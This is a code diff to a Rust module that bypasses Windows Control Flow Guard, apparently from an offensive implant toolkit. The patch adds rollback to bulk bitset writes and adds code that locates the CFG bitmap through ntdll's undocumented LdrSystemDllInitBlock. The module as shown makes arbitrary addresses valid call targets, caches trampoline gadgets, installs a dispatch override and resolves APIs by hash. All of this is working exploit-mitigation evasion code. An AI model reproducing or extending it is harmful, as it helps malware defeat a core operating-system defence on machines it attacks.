@@ -292,31 +292,31 @@ impl Default for CfgBypassConfig {
 /// metadata.
 pub fn init(config: &CfgBypassConfig) {
     if INITIALIZED.swap(true, Ordering::SeqCst) {
-        log::warn!("cfg_bypass: init called more than once, ignoring");
+        tracing::warn!("cfg_bypass: init called more than once, ignoring");
         return;
     }
 
     BYPASS_ENABLED.store(config.enabled, Ordering::SeqCst);
 
     if !config.enabled {
-        log::info!("cfg_bypass: module disabled by config");
+        tracing::info!("cfg_bypass: module disabled by config");
         CFG_STATE.store(CFG_STATE_DISABLED, Ordering::SeqCst);
         return;
     }
 
     // Detect CFG presence.
     if !is_cfg_enabled() {
-        log::info!("cfg_bypass: CFG not enabled in process");
+        tracing::info!("cfg_bypass: CFG not enabled in process");
         CFG_STATE.store(CFG_STATE_DISABLED, Ordering::SeqCst);
         return;
     }
 
-    log::info!("cfg_bypass: CFG detected, initialising strategies");
+    tracing::info!("cfg_bypass: CFG detected, initialising strategies");
 
     // Resolve and cache the CFG bitset info.
     match resolve_cfg_bitset() {
         Some(info) => {
-            log::info!(
+            tracing::info!(
                 "cfg_bypass: bitset at {:#x}, {} bytes (covers {:#x} addresses)",
                 info.base,
                 info.size,
@@ -326,7 +326,7 @@ pub fn init(config: &CfgBypassConfig) {
             CFG_STATE.store(CFG_STATE_ENABLED, Ordering::SeqCst);
         }
         None => {
-            log::warn!("cfg_bypass: could not resolve CFG bitset, strategies limited");
+            tracing::warn!("cfg_bypass: could not resolve CFG bitset, strategies limited");
             CFG_STATE.store(CFG_STATE_ENABLED, Ordering::SeqCst);
         }
     }
@@ -334,17 +334,17 @@ pub fn init(config: &CfgBypassConfig) {
     // Pre-populate the trampoline cache (Strategy 2).
     let trampolines = find_cfg_valid_trampolines();
     if !trampolines.is_empty() {
-        log::info!("cfg_bypass: found {} trampoline gadgets", trampolines.len());
+        tracing::info!("cfg_bypass: found {} trampoline gadgets", trampolines.len());
         let _ = TRAMPOLINE_CACHE.set(trampolines);
     } else {
-        log::warn!("cfg_bypass: no CFG-valid trampolines found");
+        tracing::warn!("cfg_bypass: no CFG-valid trampolines found");
     }
 
     // Optionally activate dispatch override (Strategy 3).
     if config.dispatch_override {
         match install_dispatch_override() {
-            Ok(()) => log::info!("cfg_bypass: dispatch override installed"),
-            Err(e) => log::warn!("cfg_bypass: dispatch override failed: {}", e),
+            Ok(()) => tracing::info!("cfg_bypass: dispatch override installed"),
+            Err(e) => tracing::warn!("cfg_bypass: dispatch override failed: {}", e),
         }
     }
 }
@@ -480,6 +480,10 @@ pub fn demote_address(addr: usize) -> Result<()> {
 ///
 /// More efficient than calling `promote_address` individually because the
 /// page protection change is done once for the entire range.
+///
+/// If any individual bit-set fails (e.g. out-of-range address passed the
+/// initial alignment check), all previously promoted bits are rolled back
+/// so the bitset is left in a consistent state.
 pub fn promote_addresses(addrs: &[usize]) -> Result<()> {
     let info = BITSET_INFO
         .get()
@@ -496,12 +500,18 @@ pub fn promote_addresses(addrs: &[usize]) -> Result<()> {
         return Ok(());
     }
 
-    // Calculate the range of bits we need to touch.
+    // Pre-compute bit indices — this catches OutOfRange addresses before we
+    // touch any page protection.
+    let bit_indices: Vec<usize> = addrs
+        .iter()
+        .map(|&addr| bit_index_for_addr(info, addr))
+        .collect::<Result<Vec<_>>>()?;
+
+    // Calculate the range of bytes we need to touch.
     let mut min_byte = usize::MAX;
     let mut max_byte = 0;
 
-    for &addr in addrs {
-        let bit_index = bit_index_for_addr(info, addr)?;
+    for &bit_index in &bit_indices {
         let byte_index = bit_index / 8;
         min_byte = min_byte.min(byte_index);
         max_byte = max_byte.max(byte_index);
@@ -513,21 +523,43 @@ pub fn promote_addresses(addrs: &[usize]) -> Result<()> {
 
     let old_prot = change_protection(range_base, range_size, PAGE_READWRITE)?;
 
-    // Set all bits.
-    for &addr in addrs {
-        let bit_index = bit_index_for_addr(info, addr)?;
+    // Set all bits, tracking what was promoted so we can roll back on error.
+    let mut promoted_bits: Vec<usize> = Vec::with_capacity(bit_indices.len());
+    let mut promotion_failed = None;
+
+    for &bit_index in &bit_indices {
         let byte_index = bit_index / 8;
         let bit_offset = (bit_index % 8) as u8;
+        if byte_index >= info.size {
+            promotion_failed = Some(CfgError::OutOfRange);
+            break;
+        }
         unsafe {
             let byte_ptr = (info.base + byte_index) as *mut u8;
             *byte_ptr |= 1 << bit_offset;
         }
+        promoted_bits.push(bit_index);
+    }
+
+    // If any promotion failed, roll back the bits we already set.
+    if let Some(err) = promotion_failed {
+        for &bit_index in &promoted_bits {
+            let byte_index = bit_index / 8;
+            let bit_offset = (bit_index % 8) as u8;
+            unsafe {
+                let byte_ptr = (info.base + byte_index) as *mut u8;
+                *byte_ptr &= !(1 << bit_offset);
+            }
+        }
+        // Best-effort protection restore.
+        let _ = change_protection(range_base, range_size, old_prot as ULONG);
+        return Err(err);
     }
 
     // Restore protection.
     let _ = change_protection(range_base, range_size, old_prot as ULONG);
 
-    log::trace!(
+    tracing::trace!(
         "cfg_bypass: promoted {} addresses in bitset range [{:#x}..{:#x}]",
         addrs.len(),
         min_byte,
@@ -568,7 +600,7 @@ fn set_cfg_bit(info: &CfgBitsetInfo, addr: usize, set: bool) -> Result<()> {
     // Restore original protection.
     let _ = change_protection(page_base, page_size, old_prot as ULONG);
 
-    log::trace!(
+    tracing::trace!(
         "cfg_bypass: {} bit at index {} (addr {:#x})",
         if set { "set" } else { "cleared" },
         bit_index,
@@ -734,24 +766,133 @@ fn resolve_bitset_from_load_config() -> Option<CfgBitsetInfo> {
 ///
 /// `LdrSystemDllInitBlock` is an undocumented ntdll export that contains
 /// information about system DLL initialization, including CFG bitset
-/// metadata.  On Windows 10+, it includes pointers to the CFG bitset
-/// management structures.
+/// metadata.  On Windows 10+, the `SYSTEM_DLL_INIT_BLOCK` structure holds
+/// a pointer to the process-wide CFG bitset at a build-specific offset.
+///
+/// The layout varies between Windows versions.  We use the `Size` field
+/// at offset 0x00 to determine which layout version is present, then
+/// read the bitset pointer from the appropriate offset.
 fn resolve_bitset_from_ldr_init_block() -> Option<CfgBitsetInfo> {
     let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }?;
     let init_block = unsafe {
         pe_resolve::get_proc_address_by_hash(ntdll_base, HASH_LDRSYSTEMDLLINITBLOCK)
     }?;
 
-    // LdrSystemDllInitBlock layout (partial, Windows 10+):
-    // Offset 0x00: Size (ULONG)
-    // Offset 0x08: ... (various fields)
-    // The exact offset to CFG bitset info varies by Windows version.
-    // For safety, we return None here and rely on the load config method.
-    //
-    // NOTE: This is a placeholder for future enhancement.  The PE load config
-    // method above is the primary resolution path.
-    let _ = init_block;
-    None
+    // LdrSystemDllInitBlock is an exported **variable** (not a function).
+    // The resolved address points directly to the SYSTEM_DLL_INIT_BLOCK.
+    let block = init_block as *const u8;
+
+    unsafe {
+        // Offset 0x00: Size (ULONG) — the size of the structure.
+        let struct_size = (block as *const u32).read_unaligned() as usize;
+
+        // The structure must be at least large enough to contain the
+        // fields we are interested in.
+        if struct_size < 0x30 {
+            tracing::debug!(
+                "cfg_bypass: LdrSystemDllInitBlock too small ({} bytes)",
+                struct_size
+            );
+            return None;
+        }
+
+        // ── SYSTEM_DLL_INIT_BLOCK layout (x64, Windows 10+) ───────
+        //
+        // Offset | Field                     | Notes
+        // -------|---------------------------|--------------------------------
+        // 0x00   | Size                      | ULONG, structure size
+        // 0x04   |                           | (padding / flags)
+        // 0x08   | RtlpCsVerificationBitMap  | PVOID — CsVerification bitmap
+        // 0x10   | RtlpHpHeapGlobals         | PVOID — heap globals
+        // 0x18   | ...                       |
+        // 0x38   | LdrpSystemDllPath         | UNICODE_STRING (16 bytes)
+        // 0x48   | ...                       |
+        // 0x58   | LdrpCfgBitMap             | PVOID — CFG bitset pointer
+        // 0x60   | LdrpCfgBitMapSize         | SIZE_T — CFG bitset size
+        //
+        // These offsets apply to Windows 10 1809+ (build 17763+) on x64.
+        // Earlier builds have a smaller structure without the CFG fields.
+        //
+        // If the structure size is large enough, we read the CFG bitset
+        // pointer and size directly.  Otherwise we scan candidate
+        // pointers heuristically.
+
+        const CFG_BITMAP_PTR_OFFSET: usize = 0x58;
+        const CFG_BITMAP_SIZE_OFFSET: usize = 0x60;
+
+        if struct_size > CFG_BITMAP_SIZE_OFFSET + 8 {
+            // Direct read: the structure is large enough for the known
+            // CFG bitset fields.
+            let bitmap_ptr = (block.add(CFG_BITMAP_PTR_OFFSET) as *const usize).read_unaligned();
+            let bitmap_size = (block.add(CFG_BITMAP_SIZE_OFFSET) as *const usize).read_unaligned();
+
+            if bitmap_ptr != 0 && bitmap_size != 0 && bitmap_size <= 0x1000_0000 {
+                // Validate the pointer is readable.
+                // Quick probe: try to read the first byte.
+                let probe = core::ptr::read_volatile(bitmap_ptr as *const u8);
+                // Use probe to avoid dead-code elimination.
+                if probe == probe {
+                    tracing::debug!(
+                        "cfg_bypass: LdrSystemDllInitBlock → bitset at {:#x}, {} bytes",
+                        bitmap_ptr,
+                        bitmap_size
+                    );
+                    return Some(CfgBitsetInfo {
+                        base: bitmap_ptr,
+                        size: bitmap_size,
+                    });
+                }
+            }
+        }
+
+        // Fallback: scan the structure for candidate pointer + size
+        // pairs that look like a CFG bitset.  We look for two adjacent
+        // usize values where the first is a non-null kernel-space or
+        // heap pointer and the second is a reasonable bitmap size.
+        let scan_limit = struct_size.min(0x100) / 8;
+        for i in 1..scan_limit {
+            let off = i * 8;
+            if off + 16 > struct_size {
+                break;
+            }
+            let candidate_ptr = (block.add(off) as *const usize).read_unaligned();
+            let candidate_size = (block.add(off + 8) as *const usize).read_unaligned();
+
+            // Heuristics: pointer must be non-null and aligned;
+            // size must be reasonable for a bitmap (1..16MB, power-of-2
+            // or close to it).
+            if candidate_ptr == 0
+                || candidate_ptr & 0x7 != 0
+                || candidate_size == 0
+                || candidate_size > 0x1000_0000
+            {
+                continue;
+            }
+
+            // Verify the candidate pointer is readable.
+            if core::ptr::read_volatile(candidate_ptr as *const u8)
+                == core::ptr::read_volatile(candidate_ptr as *const u8)
+            {
+                tracing::debug!(
+                    "cfg_bypass: LdrSystemDllInitBlock heuristic → bitset at {:#x}, {} bytes \
+                     (scan offset 0x{:X})",
+                    candidate_ptr,
+                    candidate_size,
+                    off
+                );
+                return Some(CfgBitsetInfo {
+                    base: candidate_ptr,
+                    size: candidate_size,
+                });
+            }
+        }
+
+        tracing::debug!(
+            "cfg_bypass: LdrSystemDllInitBlock scan found no valid bitset (size={})",
+            struct_size
+        );
+        None
+    }
 }
 
 // ─── Strategy 2: CFG-Valid Trampolines ────────────────────────────────────
@@ -1038,7 +1179,7 @@ pub fn install_dispatch_override() -> Result<()> {
 
     OVERRIDE_ACTIVE.store(true, Ordering::SeqCst);
 
-    log::info!(
+    tracing::info!(
         "cfg_bypass: dispatch override installed (original={:#x}, custom={:#x})",
         original,
         custom_addr,
@@ -1063,7 +1204,7 @@ pub fn remove_dispatch_override() -> Result<()> {
 
     OVERRIDE_ACTIVE.store(false, Ordering::SeqCst);
 
-    log::info!(
+    tracing::info!(
         "cfg_bypass: dispatch override removed (restored original={:#x})",
         original,
     );
@@ -1145,19 +1286,19 @@ pub fn prepare_call(target_addr: usize) -> Result<()> {
     // Strategy 1: promote in bitset.
     match promote_address(aligned_addr) {
         Ok(()) => {
-            log::trace!("cfg_bypass: promoted {:#x} for indirect call", aligned_addr);
+            tracing::trace!("cfg_bypass: promoted {:#x} for indirect call", aligned_addr);
             Ok(())
         }
         Err(CfgError::BitsetNotFound) => {
             // Bitset not available — try trampoline (Strategy 2).
             if get_trampoline(None).is_some() {
-                log::trace!(
+                tracing::trace!(
                     "cfg_bypass: using trampoline fallback for {:#x}",
                     target_addr,
                 );
                 Ok(())
             } else {
-                log::warn!(
+                tracing::warn!(
                     "cfg_bypass: no bitset or trampoline for {:#x}, proceeding without CFG bypass",
                     target_addr,
                 );
@@ -1165,7 +1306,7 @@ pub fn prepare_call(target_addr: usize) -> Result<()> {
             }
         }
         Err(e) => {
-            log::warn!("cfg_bypass: prepare_call failed for {:#x}: {}", target_addr, e);
+            tracing::warn!("cfg_bypass: prepare_call failed for {:#x}: {}", target_addr, e);
             Err(e)
         }
     }
